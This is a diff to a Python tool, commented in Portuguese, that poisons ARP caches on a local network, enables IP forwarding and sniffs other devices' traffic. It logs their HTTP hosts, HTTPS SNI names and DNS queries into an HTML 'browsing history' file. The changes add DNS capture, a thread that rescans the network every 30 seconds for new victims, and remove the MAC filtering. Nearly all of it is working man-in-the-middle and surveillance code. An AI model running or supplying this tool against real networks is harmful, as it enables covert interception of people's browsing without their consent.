@@ -16,7 +16,8 @@ def enable_ip_forwarding():
     """
     Habilita o IP Forwarding no Linux.
     """
-    os.system("sudo bash -c echo 1 > /proc/sys/net/ipv4/ip_forward")
+    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
+
 
 def get_network_info():
     """
@@ -204,10 +205,8 @@ def create_arp_packet(target_ip, target_mac, sender_ip, sender_mac):
     """
     # Converter endereços MAC para bytes, se necessário
     if isinstance(target_mac, str):
-        print(f"Valor de target_mac antes da conversão: {target_mac}")
         target_mac = bytes.fromhex(target_mac.replace(":", ""))
     if isinstance(sender_mac, str):
-        print(f"Valor de target_mac antes da conversão: {sender_mac}")
         sender_mac = bytes.fromhex(sender_mac.replace(":", ""))
 
     ether_header = struct.pack("!6s6sH", target_mac, sender_mac, 0x0806)  # Ethernet II + ARP
@@ -310,17 +309,41 @@ def set_promiscuous_mode(interface, enable=True):
 
     sock.close()
 
+# Dicionário global para rastrear o último acesso por domínio
+last_accessed = {}
 
+def should_log_entry(domain, threshold=60):
+    """
+    Verifica se um domínio deve ser registrado com base no tempo decorrido desde o último acesso.
 
-# Função para capturar tráfego
+    Args:
+        domain (str): O domínio a ser verificado.
+        threshold (int): Intervalo de tempo mínimo, em segundos, para considerar um novo registro.
+
+    Returns:
+        bool: True se o domínio deve ser registrado, False caso contrário.
+    """
+    current_time = time.time()
+    if domain in last_accessed:
+        # Verifica o intervalo desde o último registro
+        if current_time - last_accessed[domain] < threshold:
+            return False  # Ignorar se está dentro do intervalo
+    # Atualiza o timestamp do último acesso e permite o registro
+    last_accessed[domain] = current_time
+    return True
+
 def capture_traffic(interface, output_file, valid_macs):
     """
-    Captura pacotes HTTP e HTTPS apenas de dispositivos com MACs válidos usando a tabela ARP.
+    Captura pacotes DNS, HTTP e HTTPS, registrando as consultas no formato de URL clicável.
     """
+    # Obter o IP da máquina local para ignorar durante a captura
+    local_ip = get_network_info()[1]
+
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
     sock.bind((interface, 0))  # Vincula o socket à interface fornecida
+
     with open(output_file, "w") as f:
-        f.write("<html><header><title>Historico de Navegacao</title></header><body><ul>\n")
+        f.write("<html><header><title>Histórico de Navegação</title></header><body><ul>\n")
         try:
             while True:
                 packet = sock.recv(65535)
@@ -337,50 +360,63 @@ def capture_traffic(interface, output_file, valid_macs):
                 ip_header = packet[14:34]
                 ip_proto = struct.unpack("!B", ip_header[9:10])[0]
                 src_ip = socket.inet_ntoa(ip_header[12:16])
-                dest_ip = socket.inet_ntoa(ip_header[16:20])
 
-                # Usar a tabela ARP para obter o MAC associado ao src_ip
-                src_mac = valid_macs.get(src_ip)
-                if not src_mac:
-                    # Se não estiver na tabela ARP, ignorar
+                # Ignorar pacotes que vêm do IP local
+                if src_ip == local_ip:
                     continue
 
-                # Verificar se o MAC está na lista de válidos
-                if src_mac not in valid_macs.values():
-                    continue
-
+                # Processar tráfego HTTP
                 if ip_proto == 6:  # TCP
                     tcp_header = packet[34:54]
-                    src_port, dest_port = struct.unpack("!HH", tcp_header[0:4])
-                    data_offset = (struct.unpack("!B", tcp_header[12:13])[0] >> 4) * 4
-                    payload_offset = 14 + 20 + data_offset  # Ethernet + IP + TCP
+                    src_port, dest_port = struct.unpack("!HH", tcp_header[:4])
+                    payload_offset = 14 + 20 + ((tcp_header[12] >> 4) * 4)  # Ethernet + IP + TCP
                     payload = packet[payload_offset:]
 
-                    if dest_port == 80:  # HTTP
+                    # HTTP
+                    if dest_port == 80:  # Porta HTTP
                         try:
-                            http_data = payload.decode(errors='ignore')
-                            timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-
-                            # Extraindo URL do tráfego HTTP
-                            headers = http_data.split("\r\n")
-                            host = ""
-                            path = ""
-                            for header in headers:
-                                if header.lower().startswith("host:"):
-                                    host = header.split(": ")[1]
-                                if header.startswith("GET") or header.startswith("POST"):
-                                    path = header.split(" ")[1]
-                            if host:
-                                url = f"http://{host}{path}" if path else f"http://{host}/"
-                                f.write(f"<li>{timestamp} - {src_ip} -> {dest_ip}:{dest_port} - <a href=\"{url}\">{url}</a></li>\n")
-                                print(f"[+] HTTP URL Capturada: {url}")
-                            f.flush()
+                            http_data = payload.decode(errors="ignore")
+                            if "Host:" in http_data:
+                                host_line = [line for line in http_data.split("\r\n") if line.startswith("Host:")][0]
+                                host = host_line.split(": ")[1]
+                                timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+                                url = f"http://{host}"
+                                f.write(f"<li>{timestamp} - {src_ip} -> HTTP URL: <a href=\"{url}\">{url}</a></li>\n")
+                                print(f"[+] HTTP: {url}")
+                                f.flush()
                         except Exception as e:
-                            print(f"[Erro] Não foi possível processar o pacote HTTP: {e}")
+                            print(f"[Erro] Não foi possível processar HTTP: {e}")
+
+                    # HTTPS
+                    elif dest_port == 443:  # Porta HTTPS
+                        try:
+                            tls_data = payload
+                            sni = extract_sni(tls_data)
+                            if sni:
+                                timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+                                url = f"https://{sni}"
+                                f.write(f"<li>{timestamp} - {src_ip} -> HTTPS SNI: <a href=\"{url}\">{sni}</a></li>\n")
+                                print(f"[+] HTTPS: {url}")
+                                f.flush()
+                        except Exception as e:
+                            print(f"[Erro] Não foi possível processar HTTPS: {e}")
+
+                # Captura de pacotes DNS
+                elif ip_proto == 17:  # UDP
+                    udp_header = packet[34:42]
+                    src_port, dest_port = struct.unpack("!HH", udp_header[:4])
+                    if dest_port == 53:  # DNS
+                        dns_data = packet[42:]
+                        domain = extract_dns_query(dns_data)
+                        if domain and should_log_entry(domain):  # Aplica o filtro de tempo
+                            timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+                            url = f"http://{domain}"
+                            f.write(f"<li>{timestamp} - {src_ip} -> DNS Query: <a href=\"{url}\">{domain}</a></li>\n")
+                            print(f"[+] DNS: {domain}")
+                            f.flush()
         except KeyboardInterrupt:
             print("\n[INFO] Captura interrompida pelo usuário.")
         f.write("</ul></body></html>\n")
-
 
 
 def extract_sni(tls_data):
@@ -407,17 +443,36 @@ def extract_sni(tls_data):
                     server_name_bytes = tls_data[i + 11:i + 11 + server_name_length]
                     try:
                         # Tenta decodificar o nome do servidor como UTF-8
-                        server_name = server_name_bytes.decode("utf-8")
-                        return server_name
+                        return server_name_bytes.decode("utf-8")
                     except UnicodeDecodeError:
-                        # Se falhar, retorna o nome como sequência de bytes
-                        print("[Aviso] Nome do servidor não é UTF-8, retornando bytes.")
-                        return server_name_bytes.hex()
+                        return None
                 i += 4 + extension_length
     except Exception as e:
         print(f"[Erro] Falha ao processar SNI: {e}")
     return None
 
+
+
+
+def extract_dns_query(dns_data):
+    """
+    Extrai o nome do domínio de uma consulta DNS.
+    """
+    try:
+        transaction_id, flags, qd_count = struct.unpack("!HHH", dns_data[:6])
+        if qd_count > 0:
+            index = 12
+            domain_parts = []
+            while True:
+                length = dns_data[index]
+                if length == 0:
+                    break
+                domain_parts.append(dns_data[index + 1:index + 1 + length].decode("utf-8"))
+                index += length + 1
+            return ".".join(domain_parts)
+    except Exception as e:
+        print(f"[Erro] Falha ao extrair DNS Query: {e}")
+    return None
 
 # Função para obter o MAC do atacante
 def get_attacker_mac(interface):
@@ -427,6 +482,12 @@ def get_attacker_mac(interface):
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
     sock.bind((interface, 0))
     return sock.getsockname()[4]
+
+def update_valid_macs(interface, valid_macs):
+    new_macs = get_active_macs(interface)
+    valid_macs.update(new_macs)
+    print(f"[INFO] Tabela ARP atualizada. Novos dispositivos: {new_macs}")
+
 
 def main():
     try:
@@ -459,6 +520,16 @@ def main():
         for ip, mac in active_hosts.items():
             print(f"      * {ip} -> {mac}")
 
+        # Atualização periódica de ARP
+        def periodic_update():
+            while True:
+                update_valid_macs(interface, active_hosts)
+                time.sleep(30)  # Atualiza a cada 30 segundos
+
+        update_thread = threading.Thread(target=periodic_update)
+        update_thread.daemon = True
+        update_thread.start()
+
         # Verificar se há hosts ativos antes de continuar
         if not active_hosts:
             print("[!] Nenhum dispositivo ativo encontrado. Finalizando a aplicação.")
@@ -487,9 +558,6 @@ def main():
         # Desativar modo promíscuo ao final da execução
         set_promiscuous_mode(interface, enable=False)
         print("[*] Finalizando a aplicação...")
-
-
-
 
 if __name__ == "__main__":
     main()
